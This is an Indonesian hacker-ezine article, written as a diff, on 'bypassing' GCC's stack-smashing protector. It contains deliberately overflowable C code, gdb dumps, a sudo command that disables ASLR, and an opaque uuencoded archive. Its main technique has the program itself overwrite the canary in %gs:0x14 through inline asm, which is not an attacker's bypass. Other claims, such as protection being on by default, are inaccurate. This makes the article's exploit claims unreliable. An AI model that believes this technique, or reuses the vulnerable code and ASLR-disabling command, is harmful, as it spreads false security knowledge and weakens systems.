@@ -1,0 +1,612 @@
+                     _|                            _|                      
+   _|_|      _|_|_|  _|_|_|      _|_|    _|_|_|_|      _|_|_|      _|_|    
+ _|_|_|_|  _|        _|    _|  _|    _|      _|    _|  _|    _|  _|_|_|_|  
+ _|        _|        _|    _|  _|    _|    _|      _|  _|    _|  _|        
+   _|_|_|    _|_|_|  _|    _|    _|_|    _|_|_|_|  _|  _|    _|    _|_|_|  
+
+ECHO MAGAZINE VOLUME VIII, ISSUE XXII, PHILE 0x008.TXT
+
+Gebuk Stack Protector - BrazilianSubZero
+stan.marshx/at/yahoo/dot/com
+
+
+---[ INTRODUCTION
+
+Stack Protector atau Stack Smashing Protector merupakan sebuah modul yang
+telah diimplementasikan oleh compiler GCC sejak versi 4.1 dirilis.
+Tujuannya, sebagai layer sekuritas dalam mencegah eksekusi exploit yang
+menggunakan metode buffer overflow dan stack overflow dengan jalan
+mematikan paksa aplikasi atau program yang berusaha untuk memasukkan
+sesuatu ke area Stack sebelum terjadi Segmentation Fault. Paper ini akan
+mencoba mengulas bagaimana cara membypass Stack Protector, bagaimana metode
+pembypassannya dan sejauh mana efek yang akan diterima.
+
+
+---[ APA ITU STACK PROTECTOR?
+
+Semuanya berawal ketika Noir a.k.a Sinan Eren menerbitkan publikasi
+risetnya di zine underground Phrack edisi 60 dengan judul "Smashing the
+Kernel Stack For Fun And Profit". Tidak lama dari situ, mulai bermunculan
+berbagai macam eksploit-eksploit yang menggunakan teknik Stack Overflow
+dalam proses rooting kedalam sistem. 
+
+Dengan semakin banyaknya penetrasi sistem menggunakan teknik Stack Overflow
+ini, ditahun 1997 dikeluarkanlah modul yang mencegah terjadinya proses
+eksploitasi dengan menggunakan teknik Bufferoverflow dan Stackoverflow. Modul
+itu bernama StackGuard. Ia di rilis oleh Crispin Cowan sebagai modul tambahan
+bagi GCC dalam proses compiling aplikasi. Saat ini, StackGuard menjadi bagian
+wajib dari GCC semenjak rilis ke 4.1.
+
+Stack Protector dalam lingkungan sistem Linux lebih dikenal sebagai
+ProPolice. Prosesnya sama, ia menjadi bagian dari GCC dalam proses
+compiling untuk mencegah adanya kemungkinan proses penulisan stack yang
+dapat di eksploitasi. Secara default GCC yang banyak digunakan sekarang ini
+menerapkan opsi compiling dengan menambahkan fungsi "-fstack-protector-all" 
+kedalamnya. Fungsi itu untuk memanggil modul StackGuard Propolice agar 
+diterapkan secara default dalam setiap compiling aplikasi. 
+
+Sebagai contoh untuk mengetahui perbedaan dari proses compiling menggunakan
+stack protector dapat dilakukan dengan cara seperti ini :
+
+cuk@monyet:~/Project/StackProtect$ cat first.c
+#include <stdio.h>
+#include <string.h>
+
+int lulz(char **argv)
+{
+	int i;
+	char ptr[15];
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\nYang ini Alamatnya = %p",ptr);
+	strcpy(ptr,argv[1]);
+	printf("\nIni Lho Canariesnya = ");
+	for(i=18; i>14; i--)
+	printf("%02x",(unsigned char)*(ptr+i));
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\n\n");
+}
+
+int main(int argc,char **argv)
+{
+	if(argc>1)
+		lulz(argv);
+	return 0;
+}
+
+Saya akan mencoba untuk mengkompilasi script diatas dengan mematikan fungsi
+default stack protector dengan menggunakan opsi "-fno-stack-protector" 
+
+cuk@monyet:~/Project/StackProtect$ gcc -fno-stack-protector first.c -o first-noprotect 
+cuk@monyet:~/Project/StackProtect$ ./first-noprotect `perl -e 'print "A"x30'`
+
+------------------------------------------------------------
+Yang ini Alamatnya = 0xbfdb5ded
+Ini Lho Canariesnya = 0000000f
+------------------------------------------------------------
+
+Segmentation fault
+cuk@monyet:~/Project/StackProtect$
+
+Seperti yang terlihat dengan mendisable opsi stack protection maka input
+yang kita masukkan berusaha menulis Stack yang mengakibatkan terjadinya
+Segmentation Fault, yang merupakan kata suci bagi para EXPLOIT MAKER
+ehehehehe. Oke selanjutnya kita akan mencoba untuk melakukan compiling
+dengan menggunakan opsi stack protector diaktifkan. Karena GCC sudah
+mewajibkan dan menjadikan fungsi " -fstack-protector-all" sebagai opsi
+default maka kita hanya memerlukan kompilasi dengan normal seperti dibawah
+ini :
+
+cuk@monyet:~/Project/StackProtect$ gcc first.c -o first-secure
+cuk@monyet:~/Project/StackProtect$ ./first-secure `perl -e 'print "A"x30'`
+------------------------------------------------------------
+Yang ini Alamatnya = 0xbff2f5ad
+Ini Lho Canariesnya = 41414141
+------------------------------------------------------------
+
+*** stack smashing detected ***: ./first-secure terminated
+======= Backtrace: =========
+/lib/tls/i686/cmov/libc.so.6(__fortify_fail+0x48)[0x1f0ed8]
+/lib/tls/i686/cmov/libc.so.6(__fortify_fail+0x0)[0x1f0e90]
+./first-secure[0x80485b4]
+./first-secure[0x80485d0]
+======= Memory map: ========
+00110000-0024e000 r-xp 00000000 08:06 709        /lib/tls/i686/cmov/libc-2.10.1.so
+0024e000-0024f000 ---p 0013e000 08:06 709        /lib/tls/i686/cmov/libc-2.10.1.so
+0024f000-00251000 r--p 0013e000 08:06 709        /lib/tls/i686/cmov/libc-2.10.1.so
+00251000-00252000 rw-p 00140000 08:06 709        /lib/tls/i686/cmov/libc-2.10.1.so
+00252000-00255000 rw-p 00000000 00:00 0 
+00255000-00271000 r-xp 00000000 08:06 3528       /lib/libgcc_s.so.1
+00271000-00272000 r--p 0001b000 08:06 3528       /lib/libgcc_s.so.1
+00272000-00273000 rw-p 0001c000 08:06 3528       /lib/libgcc_s.so.1
+007ce000-007cf000 r-xp 00000000 00:00 0          [vdso]
+00fd2000-00fed000 r-xp 00000000 08:06 2592       /lib/ld-2.10.1.so
+00fed000-00fee000 r--p 0001a000 08:06 2592       /lib/ld-2.10.1.so
+00fee000-00fef000 rw-p 0001b000 08:06 2592       /lib/ld-2.10.1.so
+08048000-08049000 r-xp 00000000 08:08 918192     /home/chainloader/Project/StackProtect/first-secure
+08049000-0804a000 r--p 00000000 08:08 918192     /home/chainloader/Project/StackProtect/first-secure
+0804a000-0804b000 rw-p 00001000 08:08 918192     /home/chainloader/Project/StackProtect/first-secure
+09635000-09656000 rw-p 00000000 00:00 0          [heap]
+b77d9000-b77da000 rw-p 00000000 00:00 0 
+b77ed000-b77f0000 rw-p 00000000 00:00 0 
+bff1c000-bff31000 rw-p 00000000 00:00 0          [stack]
+Aborted
+cuk@monyet:~/Project/StackProtect$
+
+Nah seperti yang terlihat dengan memasukkan input yang dapat menerobos
+stack segment maka dengan brutal dan berlebihan (halah...) aplikasi
+tersebut ditutup dengan paksa. Bisa dilihat di bagian atas terdapat output
+"*** stack smashing detected ***: ./first-secure terminated" 
+
+dan di baris output paling akhir "Aborted".
+
+Cara kedua untuk melihat apakah opsi stack protector dipasang atau tidak
+nya pada saat compiling adalah dengan cara pembacaan ELF aplikasi. Langsung
+saja :
+
+***Check ELF stack option in first-noprotect***
+cuk@monyet:~/Project/StackProtect$ ls -al | grep first*.
+-rwxr-xr-x 1 chainloader chainloader 8482 2010-04-18 16:04 first
+-rw-r--r-- 1 chainloader chainloader  498 2010-04-18 16:04 first.c
+-rwxr-xr-x 1 chainloader chainloader 8430 2010-04-18 19:07 first-noprotect
+-rwxr-xr-x 1 chainloader chainloader 8482 2010-04-18 19:08 first-secure
+cuk@monyet:~/Project/StackProtect$ readelf -s ./first-noprotect | grep stack
+cuk@monyet:~/Project/StackProtect$ 
+****** End ******
+
+Pada aplikasi first-noprotect yang tidak menggunakan stack protector pada
+saat compiling tidak ditemukan baris stack protection di dalamnya.
+Selanjutnya pada file first-secure yang menggunakan proteksi stack di dalam
+proses compilingnya.
+
+***Check ELF stack option in first-secure***
+cuk@monyet:~/Project/StackProtect$ cuk@monyet:~/Project/StackProtect$ ls -al | grep first*.
+-rwxr-xr-x 1 chainloader chainloader 8482 2010-04-18 16:04 first
+-rw-r--r-- 1 chainloader chainloader  498 2010-04-18 16:04 first.c
+-rwxr-xr-x 1 chainloader chainloader 8430 2010-04-18 19:07 first-noprotect
+-rwxr-xr-x 1 chainloader chainloader 8482 2010-04-18 19:08 first-secure
+cuk@monyet:~/Project/StackProtect$ readelf -s ./first-secure | grep stack
+     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (3)
+    70: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@@GLIBC_2
+cuk@monyet:~/Project/StackProtect$
+******* End ******
+
+Oke, pada aplikasi first-secure yang menggunakan opsi stack protector di
+temukan adanya layer checking stack di dalamnya. Ini merupakan cara
+pengecekan paling mudah dan cepat dalam melihat apakah opsi stack ada di
+dalam proses compiling sebuah aplikasi.
+
+Lalu? apa hubungannya Stack Protector dengan proses Eksploitasi? Tentu saja
+ada. Bagi para exploit maker, layer stack protector ini jelas sangat
+menjengkelkan. POC yang bertebaran banyak yang hanya dapat dijalankan jika
+layer security di linux box kita non aktif. Apalagi, untuk remote stack
+overflow sebagian besar menyerang service-service daemon yang di compile
+dengan menggunakan opsi stack protection secara default. Sehingga banyak
+eksploit maker memutuskan diri alih profesi menjadi debt colector
+(waahahahahaha) karena mengalami jalan buntu dalam proses eksploitasi
+sebuah service. Untungnya para exploit maker tersebut tidak melacurkan diri
+menjadi maniak eskiel injeksyen (LOL!) sehingga jiwanya masih oke dan tidak
+mengalami penyusutan volume otak. 
+
+
+Ohya, Paper ini tidak akan membicarakan mengenai bagaimana teknik stack overflow 
+itu dengan detail. Karena memang bahasannya spesifik mengenai mengakali 
+stack protection.
+
+
+---[ START YOUR ENGINE
+
+-----[ 3.1 Korek-korek Layernya...
+
+Trik dalam mengelabui stack protector tidak sesulit yang dibayangkan. Hanya
+membutuhkan imajinasi dan sedikit pemahaman dalam penguasaan ASM dan C.
+Untuk mengelabui stack protector, sebelumnya perlu untuk memahami beberapa
+istilah dan cara kerja dari stack protector a.k.a ProPolice : ISTILAHNYE...
+
+Canaries menurut Tante Wikipedia adalah value yang berada diantara buffer dan
+control data. Dalam kerangka ASM, posisi canaries ini terletak diantara
+variabel lokal dan EBP. Ketika sebuah aplikasi di masukkan input data yang
+bertujuan untuk mengkorupkan area stack, maka data pertama yang menjadi corupt
+adalah canaries ini. Sehingga, didalam proteksi Stack,canaries dijadikan
+sebagai pemberi peringatan pertama jika terjadi proses pengkorupan atau
+pengerusakan stack area. 
+
+Lebih jauh, canaries juga dijadikan layer untuk pemberi peringatan jika buffer
+menjadi overflow.  Salah satu fungsi penting di dalam proses pemberian
+peringatan yang dilakukan canaries adalah, apabila canaries mendadak corrupt
+maka aplikasi akan di matikan pada saat itu juga, sebelum terjadi segmentation
+fault.
+
+   ----------------------
+   |                    |
+   |        EIP         |
+   ----------------------
+   |                    |
+   |        EBP         |
+   ----------------------
+   |                    |
+   |      Canaries      | <-- Letak Canariesnya yang perlu di rusak ohohohoho
+   ----------------------
+   |                    |
+   |   Variabel Lokal   |
+   ----------------------
+
+Beberapa jenis canaries di dalam stack protector ini antara lain adalah
+Random, Terminator, dan XOR canaries. Ada beberapa teknik yang digunakan
+untuk membypass stack protection oleh beberapa pembuat exploit. Yang paling
+gampang adalah mematikan security layer di box linux anda dengan manual
+(sudo bash -c 'echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf')
+namun tentu saja itu hanya sekedar melatih kemampuan dalam hal berolah
+teknis stack overfow. 
+
+Dan cara yang kedua adalah dengan menggunakan teknik yang disebut dengan
+return-to-libc. Ini dipopulerkan oleh c0ntex dalam papernya "Bypassing
+non-executable-stack during exploitation using return-to-libc". Teknik ini
+menekankan pada proses eksploitasi Stack Protection dalam area Terminator
+Canaries. Kelemahan Terminator Canaries adalah ketika ia mengembalikan value
+yang bermasalah untuk kemudian di matikan, maka ia akan kembali ke keadaan
+semula dengan value yang mudah diprediksikan oleh libc. Dan ini yang kemudian
+dijadikan oleh c0rtex sebagai acuan di dalam mengelabui Stack Protection.
+Untungnya (atau sayangnya...ehehehe) bug ini telah di patch. 
+
+Lalu cara ketiga adalah dengan mengeksploitasi XOR Canaries atau sering
+disebut dengan Random XOR Canaries yang dipublikasikan oleh Bulba and Kil3r
+pada terbitan phrack edisi 56 yang berjudul "Bypassing Stackguard and
+Stackshield". Eksploitasi ini menekankan pada pemanfaatan Pointer yang
+digunakan sebagai trigger dalam mengkorupkan stack. Pada saat itu proteksi
+terhadap stack belum menyentuh bagian pointer (atau longjmp). Dan kembali
+lagi, untungnya (atau sayangnya... wakakakak) developer stackprotector
+sudah menambah modul untuk mengatasi trik mengelabui stack protector ala
+Bulba and Kil3r ini. 
+
+Untuk tulisan ini, saya hanya akan memfokuskan hanya pada Random Canaries.
+Alasannya, pertama adalah dua canaries sebelumnya telah di mentahkan oleh
+orang-orang sebelumnya. Dan alasan kedua adalah, bagi Crispin Cowan si
+empunya Stack Protector ini, Random Canaries merupakan metode yang paling
+memungkinkan dan memang belum berhasil dilewati oleh atau di usili oleh
+para maniak stack overflow, bahkan cenderung untuk menghindari jebakan
+Random canaries ini. 
+
+Random Canaries merupakan value yang di generate secara acak, untuk menyulitkan
+exploiter yang ingin mengetahui value di dalamnya. Dengan metode acak ini,
+setiap kali sebuah program dieksekusi maka ia akan menampilkan nilai yang
+berbeda-beda. Biasanya, metode acak yang digunakan dalam random canaries ini
+dipakai oleh aplikasi service atau daemon. Dan untuk membedakan teknik saya ini
+dengan yang lainnya, maka saya putuskan untuk menggusur Random Canaries ini heh
+heh heh. 
+
+Errr sebenarnya ini juga ketemu nggak sengaja, kepingin gabungin Stack
+Overflow sama Null Pointer malah keasikan di stack protector ini. Ah yo wes
+lanjut kang...tariiik....
+
+
+----[ 3.2 Finding the Canaries...en Digebuk Ehehehe
+
+Oke, tanpa banyak basa-basi, mari kita mulai pencarian dimana letak
+canaries tersebut, dimana letak register dan controlernya. Saya akan
+menggunakan script diatas sebelumnya sebagai contoh.
+
+cuk@monyet:~/Project/StackProtect$ cat first.c
+#include <stdio.h>
+#include <string.h>
+
+int lulz(char **argv)
+{
+	int i;
+	char ptr[15];
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\nYang ini Alamatnya = %p",ptr);
+	strcpy(ptr,argv[1]);
+	printf("\nIni Lho Canariesnya = ");
+	for(i=18; i>14; i--)
+	printf("%02x",(unsigned char)*(ptr+i));
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\n\n");
+}
+
+int main(int argc,char **argv)
+{
+	if(argc>1)
+		lulz(argv);
+	return 0;
+}
+
+cuk@monyet:~/Project/StackProtect$ gcc first.c -o first-secure //Compile dengan default stack protector terpasang
+cuk@monyet:~/Project/StackProtect$ gdb first-secure
+GNU gdb (GDB) 7.0-ubuntu
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /home/chainloader/Project/StackProtect/first-secure...done.
+(gdb) disasseble lulz
+Dump of assembler code for function lulz:
+0x080484e4 <lulz+0>:	push   %ebp
+0x080484e5 <lulz+1>:	mov    %esp,%ebp
+0x080484e7 <lulz+3>:	sub    $0x48,%esp
+0x080484ea <lulz+6>:	mov    0x8(%ebp),%eax
+0x080484ed <lulz+9>:	mov    %eax,-0x2c(%ebp)
+0x080484f0 <lulz+12>:	mov    %gs:0x14,%eax
+0x080484f6 <lulz+18>:	mov    %eax,-0xc(%ebp)
+0x080484f9 <lulz+21>:	xor    %eax,%eax
+0x080484fb <lulz+23>:	movl   $0xa,(%esp)
+0x08048502 <lulz+30>:	call   0x80483c4 <putchar@plt>
+0x08048507 <lulz+35>:	mov    $0x80486a0,%eax
+0x0804850c <lulz+40>:	mov    %eax,(%esp)
+0x0804850f <lulz+43>:	call   0x80483f4 <printf@plt>
+0x08048514 <lulz+48>:	mov    $0x80486dd,%eax
+0x08048519 <lulz+53>:	lea    -0x1b(%ebp),%edx
+0x0804851c <lulz+56>:	mov    %edx,0x4(%esp)
+0x08048520 <lulz+60>:	mov    %eax,(%esp)
+0x08048523 <lulz+63>:	call   0x80483f4 <printf@plt>
+0x08048528 <lulz+68>:	mov    -0x2c(%ebp),%eax
+0x0804852b <lulz+71>:	add    $0x4,%eax
+0x0804852e <lulz+74>:	mov    (%eax),%eax
+0x08048530 <lulz+76>:	mov    %eax,0x4(%esp)
+---Type <return> to continue, or q <return> to quit---
+0x08048534 <lulz+80>:	lea    -0x1b(%ebp),%eax
+0x08048537 <lulz+83>:	mov    %eax,(%esp)
+0x0804853a <lulz+86>:	call   0x80483e4 <strcpy@plt>
+0x0804853f <lulz+91>:	mov    $0x80486f6,%eax
+0x08048544 <lulz+96>:	mov    %eax,(%esp)
+0x08048547 <lulz+99>:	call   0x80483f4 <printf@plt>
+0x0804854c <lulz+104>:	movl   $0x12,-0x20(%ebp)
+0x08048553 <lulz+111>:	jmp    0x8048578 <lulz+148>
+0x08048555 <lulz+113>:	mov    -0x20(%ebp),%edx
+0x08048558 <lulz+116>:	lea    -0x1b(%ebp),%eax
+0x0804855b <lulz+119>:	add    %edx,%eax
+0x0804855d <lulz+121>:	movzbl (%eax),%eax
+0x08048560 <lulz+124>:	movzbl %al,%edx
+0x08048563 <lulz+127>:	mov    $0x804870e,%eax
+0x08048568 <lulz+132>:	mov    %edx,0x4(%esp)
+0x0804856c <lulz+136>:	mov    %eax,(%esp)
+0x0804856f <lulz+139>:	call   0x80483f4 <printf@plt>
+0x08048574 <lulz+144>:	subl   $0x1,-0x20(%ebp)
+0x08048578 <lulz+148>:	cmpl   $0xe,-0x20(%ebp)
+0x0804857c <lulz+152>:	jg     0x8048555 <lulz+113>
+0x0804857e <lulz+154>:	movl   $0xa,(%esp)
+0x08048585 <lulz+161>:	call   0x80483c4 <putchar@plt>
+0x0804858a <lulz+166>:	mov    $0x80486a0,%eax
+---Type <return> to continue, or q <return> to quit---
+0x0804858f <lulz+171>:	mov    %eax,(%esp)
+0x08048592 <lulz+174>:	call   0x80483f4 <printf@plt>
+0x08048597 <lulz+179>:	movl   $0x8048713,(%esp)
+0x0804859e <lulz+186>:	call   0x8048414 <puts@plt>
+0x080485a3 <lulz+191>:	mov    -0xc(%ebp),%edx
+0x080485a6 <lulz+194>:	xor    %gs:0x14,%edx
+0x080485ad <lulz+201>:	je     0x80485b4 <lulz+208>
+0x080485af <lulz+203>:	call   0x8048404 <__stack_chk_fail@plt>
+0x080485b4 <lulz+208>:	leave  
+0x080485b5 <lulz+209>:	ret    
+End of assembler dump.
+(gdb)
+
+Nah lihat di 5 baris terakhir.
+
+---------------------------snip------------------------------------
+0x080485a6 <lulz+194>:	xor    %gs:0x14,%edx
+0x080485ad <lulz+201>:	je     0x80485b4 <lulz+208>
+0x080485af <lulz+203>:	call   0x8048404 <__stack_chk_fail@plt>
+0x080485b4 <lulz+208>:	leave  
+0x080485b5 <lulz+209>:	ret
+---------------------------snap------------------------------------
+
+Maksud dari potongan dump diatas ini diartikan seperti ini :
+1. Membandingkan value yang ada di dalam canary dengan register %gs di offset 0x14
+2. Jika tidak sama nilainya maka akan memanggil fungsi __stack_chk_fail
+   yang kemudian menghentikan secara paksa eksekusi aplikasi tersebut.  
+3. Kill the application.
+
+Letak Controller registernya di atur oleh kernel, dan tampaknya perlu kita
+intip sedikit seperti apa set registernya tersebut.
+
+chainloader@monyet:~/Project/StackProtect$ grep '%%gs' /usr/src/linux-headers-2.6.31-20/arch/x86/include/asm/stackprotector.h
+	asm("mov %0, %%gs" : : "r" (__KERNEL_STACK_CANARY) : "memory");
+	asm volatile ("mov %0, %%gs" : : "r" (0));
+chainloader@monyet:~/Project/StackProtect$
+
+Oke, controler set registernya adalah asm volatile 
+("mov %0, %%gs" : : "r" (0)); 
+
+maka untuk mengetahui apakah bisa menimpa register GS tersebut dengan
+canaries versi kita sendiri atau shellcode mungkin, adalah dengan
+menambahkan beberapa baris kode tambahan asm volatile diatas ke list kode
+first.c seperti dibawah ini :
+
+chainloader@monyet:~/Project/StackProtect$ cat second.c //ini versi kedua dari first.c setelah di tambah asm volatile.
+#include <stdio.h>
+#include <string.h>
+
+typedef unsigned long in_yeah;
+#define in_digees "%0lx"
+#define steal(in_in) asm volatile("mov %%gs:(0x14), %0" : "=r" (in_in));
+
+int lulz(char **argv)
+{
+	int i;
+	char ptr[15];
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\nYang ini Alamatnya = %p",ptr);
+	strcpy(ptr,argv[1]);
+	printf("\nIni Lho Canariesnya = ");
+	for(i=18; i>14; i--)
+	printf("%02x",(unsigned char)*(ptr+i));
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\n\n");
+}
+
+int main(int argc,char **argv)
+{
+	in_yeah in_in;
+	steal(in_in);
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\nNilai di Register GS : " in_digees, in_in);
+	if(argc>1)
+		lulz(argv);
+	return 0;
+} 
+chainloader@monyet:~/Project/StackProtect$
+
+Dapat dilihat di bagian 
+
+	#define steal(in_in) asm volatile("mov %%gs:(0x14),%0" : "=r" (in_in)); 
+
+itu kita modifikasi sedikit, untuk menguji apakah sama nilai register GS
+dengan canaries yang akan kita kulik-kulik sedikit itu.
+
+chainloader@monyet:~/Project/StackProtect$ gcc second.c -o second-secure //di compile dengan stack protector
+chainloader@monyet:~/Project/StackProtect$ ./second-secure `perl -e 'print "A"x10'` 
+
+------------------------------------------------------------
+Nilai di Register GS : 56c4cd00
+------------------------------------------------------------
+Yang ini Alamatnya = 0xbf9d3f6d
+Ini Lho Canariesnya = 56c4cd00
+------------------------------------------------------------
+
+chainloader@monyet:~/Project/StackProtect$
+
+Oke bisa dilihat sama khan. Berarti memang benar kalau proses pengecekan
+atau validasi seperti itu yang terjadi. Lalu? bagaimana caranya untuk
+menuliskan sendiri atau mengkorupkan register GS tanpa ditahan oleh stack
+protector? Sederhana saja, dari script diatas, kita hanya perlu memasukkan
+4 karakter awal dari kumpulan input yang akan mengkorupkan stack (atau
+shellcode ehehehe) di dalam register GS. 
+
+Maka logikanya, pada proses validitas akan terlihat valid, namun canariesnya
+akan terkorup dan inputan yang dimasukkan akan menimpa stack. Jadi, dia tetap
+valid tetapi menulis Stack.  
+
+Contoh langsungnya...
+
+chainloader@monyet:~/Project/StackProtect$ cat third.c
+#include <stdio.h>
+#include <string.h>
+
+#define ciat() asm volatile("mov %0, %%gs:(0x14)" :: "r" (0x41414141)); //masukkan disini karakter validasinya, saya akan menginputkan karakter A
+
+int lulz(char **argv)
+{
+	int i;
+	char ptr[15];
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\nYang ini Alamatnya = %p",ptr);
+	strcpy(ptr,argv[1]);
+	printf("\nIni Lho Canariesnya = ");
+	for(i=18; i>14; i--)
+	printf("%02x",(unsigned char)*(ptr+i));
+	printf("\n");
+	printf("------------------------------------------------------------");
+	printf("\n\n");
+}
+
+int main(int argc,char **argv)
+{
+	if(argc>1)
+	{
+		ciat();
+		lulz(argv);
+	}
+	return 0;
+}
+ 
+chainloader@monyet:~/Project/StackProtect$ gcc third.c -o third-secure //compile dengan opsi stack protector
+chainloader@monyet:~/Project/StackProtect$ ./third-secure `perl -e 'print "A"x27'`
+
+------------------------------------------------------------
+Yang ini Alamatnya = 0xbfaf4bcd
+Ini Lho Canariesnya = 41414141
+------------------------------------------------------------
+
+Segmentation fault
+
+chainloader@monyet:~/Project/StackProtect$
+
+Bisa dilihat bahwa stack berhasil di buat menjadi korup dengan tetap
+tervalidasi. Hanya dengan mengeset ulang register GS yang di handle oleh
+kernel. Berarti... sukses deh ngegebuk Stack protectornya ihiy cihuy yay
+yay teroret jreng jreng.
+
+
+
+---[ KESIMPULAN
+
+Stack Protector sebagai sebuah layer sekuritas di dalam mengamankan sistem
+dari eksploitasi stack overflow sampai saat ini masih menjadi salah satu
+dari sekian banyak aplikasi yang menjadi ujung tombak dari "kebersihan"
+sebuah sistem. Dengan adanya teknik untuk mengelabui Stack Protector, bisa
+jadi akan membuka kembali euforia stack overflow party yang sempat mewabah
+di akhir tahun 2000. 
+
+Dan untuk stack protector di keluarga *NIX lainnya seperti FreeBSD, OpenBSD,
+NetBSD dan Solaris tampaknya memiliki kelemahan yang sama, yaitu validasi
+register GS yang mudah dikelabui. Saya sendiri masih mengembangkan teknik
+mengelabui Stack protector di lingkungan keluarga BSD. Dan kemungkinan untuk
+bisa di eksploitasi cukup besar hohoho.     
+
+---[ REFERENSI
+
+[xx] Angelo Rosiello, "Stack Overflow's Analysis & Exploiting Ways"
+	http://www.securitydocs.com/library/2624
+
+[xx] Bulba and Kil3r, "Bypassing Stackguard and Stackshield"
+	http://www.phrack.com/archives/56/p56_0x05_Bypassing%20StackGuard%20and%20StackShield_by_Kil3r%20&%20Bulba.txt
+
+[xx] C0rtex, "Bypassing non-executable-stack during exploitation using return-to-libc"
+	www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf
+
+[xx] Crispin Cowan, "Protecting Systems from Stack Smashing Attacks with StackGuard"
+	http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.135.2164&rep=rep1&type=pdf
+ 
+[xx] Crispin Cowan, "StackGuard: Automatic Adaptive Detection and Prevention of Buffer-Overflow Attacks"
+	http://www.usenix.org/publications/library/proceedings/sec98/full_papers/cowan/cowan_html/cowan.html
+
+[xx] Cyb3rh3b, "Stack-based Buffer Overflow :Exploitasi Lokal Stack Based Buffer Overflow di Mesin Linux"
+	http://kecoak-elektronik.net/web/fezine/localstackov.txt
+
+[xx] James C.Foster, "Bufferoverflow Attacks : Detect, Exploit, Prevent", Syngress Publishing, MA, 2005
+
+[xx] Sinan "noir" Eren, "Smashing The Kernel Stack For Fun And Profit"
+	http://www.phrack.com/archives/60/p60_0x06_Smashing%20The%20Kernel%20Stack%20For%20Fun%20And%20Profit_by_noir.txt
+
+[xx] Wikipedia, "Bufferoverflow Protection"
+	http://en.wikipedia.org/wiki/Buffer_overflow_protection#StackGuard
+
+[xx] Paul Rascagneres - "Stack Smashing Protector in FreeBSD"
+        http://hackitoergosum.org/
+
+
+--[ CURCOL
+
+Wakakakakak curcol XD blah wtf am i reading here (-_-') kill the
+authors..!!!
+
+--[ SKRAPT
+
+begin 644 stackprotectordigebuk.tar.gz
+M'XL(`)U!RTL``^V6_VO:0!3`_=7\%8\4(7&QY#2UHTYA[(<Q&/MA^VFTI1S)
+M&1_$BUQ.T8W^[WT7.[5;P<+0XO8^HO'NY;[EGI]SC*:RYVGCD,1$/TG<55Q>
+MQ+M7AZ!H0XA>O]OO)K'H->C=IS#$!YW5(_/*2@/02"<2=5'*3)EG[]L7/U'.
+M4*?%/%/PKK(9EN>3D;=;95#GKLY#;:&8%S\">@X&VFUI\D7H_?2:+H`#KUG7
+MSZRY%A>W5)Q12SL._!OMASO%SE_PI*,;_5WJ'%`CO"_D5%J]DC"$ULR/:!+N
+M3II\.EL%5(K<9*_%[=/VGZCIYTD)'Z26!E6U[J`>9%R:`(?B[0!P)!+Z['3"
+M;=-6W%WZ43#7%>9:9>!6'K;=0&\P#(^R]G7/]^MMF5)B!NX++3.-_MB?<>#J
+M1X)6T*QWL`Y1=T;9N=$04T>OG87,:U&IM-3980^`??Y/^CO^[SO_U\<`^_\(
+MO-3_=C53F1K#QGI%6>OW;J7D9."=40RU<A49YDI50)HLEOXF4%DE"[+4'>H0
+M9#6%15E(BX4*_&FY@%8KKZZ">"F2,()6[,,5^$/CPV,+TA6?0"=[`JV3!.JM
+MK!_+-A6.,M<O6$B$#.&KRI%&-_#QFTNP;;9&L)G.?W9>V@F:`^M_K_]%[W+C
+M?Q$G]?__1+#_C\%+_?_+XRE*&SQK\#C:M3@9G'YASN#Q,A'K%VO\I#6^(T8J
+G-M>9,/C=DO?_J"@9AF$8AF$8AF$8AF$8AF$8YH1X`&MU^=T`*```
+`
+end
